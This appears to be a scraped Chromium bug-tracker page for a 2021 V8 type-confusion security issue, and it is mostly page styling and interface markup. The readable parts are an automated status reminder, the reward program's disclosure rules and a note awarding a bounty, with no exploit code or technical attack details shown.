        pthier: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?<span class="line"><!---->pthier: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?<!----></span><br><br>If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?<span class="line"><!---->If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?<!----></span><br><br>If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.<span class="line"><!---->If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.<!----></span><br><br>Thanks for your time! To disable nags, add the Disable-Nags label.<span class="line"><!---->Thanks for your time!         *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

        Congratulations, Brendon! The VRP Panel has decided to award you $20,000 for this high quality report + V8 exploit and patch bonus. Thank you for all your efforts and great work!<span class="line"><!---->Congratulations, Brendon! The VRP Panel has decided to award you $20,000 for this high quality report + V8 exploit and patch bonus.         for LitElement.

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

    <mr-app loginurl="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fuc.appengine.google.com%2F_ah%2Fconflogin%3Fcontinue%3Dhttps%253A%252F%252Fbugs.chromium.org%252Fp%252Fchromium%252Fissues%252Fdetail%253Fid%253D1260129%2526q%253Dlabel%25253Aexternal_security_report%2526can%253D1%2526start%253D3700" logouturl="https://bugs.chromium.org/_ah/logout?continue=https://accounts.google.com/Logout%3Fcontinue%3Dhttps://uc.appengine.google.com/_ah/logout%253Fcontinue%253Dhttps://www.google.com/url%25253Fsa%25253DD%252526q%25253Dhttps://bugs.chromium.org/p/chromium/issues/detail%2525253Fid%2525253D1260129%25252526q%2525253Dlabel%252525253Aexternal_security_report%25252526can%2525253D1%25252526start%2525253D3700%252526ust%25253D1703409256067621%252526usg%25253DAOvVaw37W-7bsvjhVeyc34fDIhuO%26service%3Dah" versionbase="https://61906-5c6a57f-dot-monorail-prod.appspot.com" projectalert=""><!---->
      <style>
        
  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }
      </style>
      <mr-header></mr-header>

      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;

        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;

            width: 100%;
            padding: 0;

          }

        @media (max-width: 840px) {

            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }

            width: 100%;

            min-height: 0;

          }

          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;

            border: 0;
          }

        @media (max-width: 840px) {

            width: 100%;

          }

            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }

      </style>

          padding-bottom: 1em;
          display: flex;
          align-items: stretch;
          justify-content: flex-start;
          flex-direction: column;
          margin: 0;
          box-sizing: border-box;
        }
        h3 {
          margin-top: 1em;
        }
        mr-description {
          margin-bottom: 1em;
        }
        mr-edit-issue {
          margin-top: 40px;
        }
      </style>
      <mr-description></mr-description>
      <mr-comment-list headinglevel="2"></mr-comment-list>
      
    <!----></mr-issue-details>
              <mr-launch-overview class="main-item" hidden=""><!---->
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      <style>
        mr-launch-overview {
          max-width: 100%;
          display: flex;
          flex-flow: column;
          justify-content: flex-start;
          align-items: stretch;
        }
        mr-launch-overview[hidden] {
          display: none;
        }
        mr-phase {
          margin-bottom: 0.75em;
        }
      </style>
      
      
    <!----></mr-launch-overview>
            </div>
          </div>
        </div>

 loadQueue[i]();
 delete loadQueue;

 function _go(url, newWindow) {
 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;
 }
 function $(id) { return document.getElementById(id); }
 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;
 };
<script type="text/javascript" nonce="">
 function _go(url, newWindow) {
 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;
 }
 function $(id) { return document.getElementById(id); }
 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;
 };
</script>

      background-image: url('https://storage.cloud.google.com/chops-feedback/icon.png');
      background-size: cover;
      bottom: 32px;
      height: 32px;
      opacity: .4;
      position: fixed;
      right: 24px;
      text-decoration: none;
      transition: opacity .2s;
      width: 32px;
      z-index: 8675309; /* Jenny */
    }
    .__crdxFeedbackButton:hover,
    .__crdxFeedbackButton:hover::after {
      opacity: .75;
    }
    .__crdxFeedbackButton::after {
      color: #707070;
      content: "Feedback";
      font-size: 12px;
      left: 50%;
      opacity: 0;
      position: absolute;
      text-decoration: none;
      top: 28px;
      transform: translateX(-50%);
      transition: opacity .4s;
      -webkit-transform: translateX(-50%);
    }

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }

        <div class="keyboard-help">
          <!---->
            <div class="keyboard-help-section">
              <span></span><span class="help-title"><!---->Issue list<!----></span>

                <span class="key-shortcut">

                    <span class="key-separator"> / </span>

                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->open the current issue<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->Shift-O<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->open issue in new tab<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->x<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->select the current issue<!----></span>
              <!---->
            </div>
          <!---->
            <div class="keyboard-help-section">
              <span></span><span class="help-title"><!---->Issue details<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->k<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->j<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->prev/next issue in list<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->u<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->up to issue list<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->r<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->reply to current issue<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->Ctrl+Enter<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->⌘+Enter<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->save issue reply (submit issue on issue filing page)<!----></span>
              <!---->
            </div>
          <!---->
            <div class="keyboard-help-section">
              <span></span><span class="help-title"><!---->Anywhere<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->/<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->focus on the issue search field<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->c<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->compose a new issue<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->s<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->star the current issue<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->?<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->show this help dialog<!----></span>
              <!---->
            </div>
          <!---->
        </div>
        
          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.
        <p>
          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.
        </p>

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

            Issue 1260129: Security: V8 CreateLiteral type confusion when processing ..spread leads to RCE
          <h1>
            
            Issue 1260129: Security: V8 CreateLiteral type confusion when processing ..spread leads to RCE
          </h1>
          
            Reported by
            
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>
      cthomp@chromium.org<a id="user-link" href="/u/1324661417" title="cthomp@chromium.org"><!---->cthomp@chromium.org<!----></a>
      cthomp@chromium.org<span id="user-text" hidden=""><!---->cthomp@chromium.org<!----></span>
      <div id="availability-text" class="availability-notice" title="undefined" hidden=""><!----><!----></div>
    <mr-user-link aria-label="issue reporter"></mr-user-link>
            on 
      Thu, Oct 14, 2021, 5:24 PM EDT
    <chops-timestamp title="Thu, Oct 14, 2021, 5:24 PM EDT"></chops-timestamp>
            
              Project Member<span class="role-label">Project Member</span>
          <small class="byline">
            Reported by
            <mr-user-link aria-label="issue reporter"></mr-user-link>
            on <chops-timestamp title="Thu, Oct 14, 2021, 5:24 PM EDT"></chops-timestamp>
            
              <span class="role-label">Project Member</span>
          </small>
        <div class="main-text">
          <h1>
            
            Issue 1260129: Security: V8 CreateLiteral type confusion when processing ..spread leads to RCE
          </h1>
          <small class="byline">
            Reported by
            <mr-user-link aria-label="issue reporter"></mr-user-link>
            on <chops-timestamp title="Thu, Oct 14, 2021, 5:24 PM EDT"></chops-timestamp>
            
              <span class="role-label">Project Member</span>
          </small>
        </div>
      <div class="main-text-outer">
        <div class="main-text">
          <h1>
            
            Issue 1260129: Security: V8 CreateLiteral type confusion when processing ..spread leads to RCE
